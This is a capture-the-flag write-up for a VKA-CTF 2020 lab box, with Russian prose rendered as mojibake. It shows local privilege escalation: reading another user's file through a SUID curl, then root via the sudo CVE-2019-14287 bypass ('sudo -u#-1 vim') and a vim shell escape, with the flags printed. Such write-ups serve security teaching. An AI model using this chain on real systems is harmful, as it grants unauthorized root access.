## Ð¡ÑƒÐ´Ð¾Ñ…Ð¾Ð´

| Ð¡Ð¾Ð±Ñ‹Ñ‚Ð¸Ðµ | ÐÐ°Ð·Ð²Ð°Ð½Ð¸Ðµ | ÐšÐ°Ñ‚ÐµÐ³Ð¾Ñ€Ð¸Ñ | Ð¡Ð»Ð¾Ð¶Ð½Ð¾ÑÑ‚ÑŒ |
|:--------|:---------|:----------|----------:|
| VKA-CTF`2020 | Ð¡ÑƒÐ´Ð¾Ñ…Ð¾Ð´ | HTB | ÐÐ‘Ð˜Ð¢Ð£Ð Ð/1-3 ÐºÑƒÑ€Ñ |

### ÐžÐ¿Ð¸ÑÐ°Ð½Ð¸Ðµ
> ÐÐ²Ñ‚Ð¾Ñ€: [ ð•‚ð•£ð•’ð•¦ð•¤ð•– ]
>
> Ð”ÐµÐ¹ÑÑ‚Ð²Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ð¾ Ð»Ð¸ ÑÑ‚Ð¾ Ð±ÐµÐ·Ð¾Ð¿Ð°ÑÐ½Ð¾?
>
>`ssh reborn@example.com`

### Ð ÐµÑˆÐµÐ½Ð¸Ðµ
#### USER
---
Ð£ ÑƒÑ‚Ð¸Ð»Ð¸Ñ‚Ñ‹ `cURL` ÑƒÑÑ‚Ð°Ð½Ð¾Ð²Ð»ÐµÐ½ `SUID bit`, Ð° Ð²Ð»Ð°Ð´ÐµÐ»Ñ†ÐµÐ¼ Ð´Ð°Ð½Ð½Ð¾Ð³Ð¾ Ñ„Ð°Ð¹Ð»Ð° ÑÐ²Ð»ÑÐµÑ‚ÑÑ `super-server`. Ð˜ÑÐ¿Ð¾Ð»ÑŒÐ·ÑƒÐµÐ¼ ÑÑ‚Ð¾, Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ñ‡Ð¸Ñ‚Ð°Ñ‚ÑŒ Ñ„Ð°Ð¹Ð»Ñ‹ ÑÑ‚Ð¾Ð³Ð¾ Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ.
```bash
> curl file:///home/super-server/user.txt
vka{wh47_15_5u1d_b17
```

**Ð¤Ð»Ð°Ð³:**

> vka{wh47_15_5u1d_b17}

#### ROOT
---
ÐŸÐ¾ÑÐ¼Ð¾Ñ‚Ñ€Ð¸Ð¼ Ð½Ð° ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹, ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð¼Ñ‹ Ð¼Ð¾Ð¶ÐµÑ‚ Ð²Ñ‹Ð¿Ð¾Ð»Ð½Ð¸Ñ‚ÑŒ Ð¾Ñ‚ Ð¸Ð¼ÐµÐ½Ð¸ ÑÑƒÐ¿ÐµÑ€Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ
```bash
$ sudo -l
User reborn may run the following commands on host:
    (ALL, !root) NOPASSWD: /usr/bin/vim
```
Ð”Ð°Ð½Ð½Ð°Ñ Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ° ÐºÐ¾Ð½Ñ„Ð¸Ð³ÑƒÑ€Ð°Ñ†Ð¸Ð¸ ÑÐ²Ð»ÑÐµÑ‚ÑÑ ÑƒÑÐ·Ð²Ð¸Ð¼Ð¾Ð¹ Ð´Ð»Ñ Ð²Ñ‹Ð¿Ð¾Ð»Ð½ÐµÐ½Ð¸Ñ ÑƒÐºÐ°Ð·Ð°Ð½Ð½Ð¾Ð¹ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹ Ð¾Ñ‚ Ð¸Ð¼ÐµÐ½Ð¸ ÑÑƒÐ¿ÐµÑ€Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ, ÐµÑÐ»Ð¸ ÑƒÑÑ‚Ð°Ð½Ð¾Ð²Ð»ÐµÐ½ SUDO Ð²ÐµÑ€ÑÐ¸ÐµÐ¹ Ð¼ÐµÐ½ÑŒÑˆÐµÐ¹, Ñ‡ÐµÐ¼ 1.8.28
[CVE-2019-14287](https://www.sudo.ws/alerts/minus_1_uid.html)

```bash
$ sudo -u#-1 vim
```

Ð”Ð°Ð»ÐµÐµ Ð½ÐµÐ¾Ð±Ñ…Ð¾Ð´Ð¸Ð¼Ð¾ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ `shell`. ÐÐ° ÑÐ°Ð¹Ñ‚Ðµ [gtfobins](https://gtfobins.github.io/gtfobins/vim/) ÑƒÐºÐ°Ð·Ð°Ð½Ð¾, ÐºÐ°Ðº ÑÑ‚Ð¾ ÑÐ´ÐµÐ»Ð°Ñ‚ÑŒ
```
:set shell=/bin/bash
:shell
```
ÐŸÐ¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ `shell` Ñ Ð¿Ñ€Ð°Ð²Ð°Ð¼Ð¸ ÑÑƒÐ¿ÐµÑ€Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ Ð¸ Ñ‡Ð¸Ñ‚Ð°ÐµÐ¼ Ñ„Ð»Ð°Ð³
```bash
$ id
uid=0(root) gid=1001(reborn) groups=1001(reborn)
```

**Ð¤Ð»Ð°Ð³:**

> vka{n3v3r_f0r637_CV3}